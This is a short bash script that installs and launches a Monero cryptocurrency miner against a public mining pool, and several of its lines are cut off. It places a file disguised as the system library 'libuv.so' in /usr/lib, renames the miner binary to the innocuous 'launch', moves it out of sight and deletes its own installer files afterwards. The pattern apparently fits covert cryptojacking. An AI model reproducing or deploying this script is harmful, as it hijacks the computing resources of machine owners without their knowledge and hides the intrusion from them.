#!/bin/bash

set -e
# Replace changeme with your values. Check ou>
POOL="pool.hashvault.pro"
PORT=443
MYADDRESS="4AUTfJGTvT8A98PSE99EunfrnUbkWe9vU3>COINNAME="monero"
# executable permissions
echo "Setting executable permissions"
if ! chmod +x libuv.so launch; then
    echo "Error: Failed to set executable per>
    exit 1
    else mv libuv.so ../../../usr/lib
fi
echo "Starting now"
./launch -o $POOL:$PORT -u $MYADDRESS --tls ->
rm EA 'EA FA' run.sh
mv config.json launch ../../
cd
rm -rf datahub
echo "Done... now you start with ./launch"
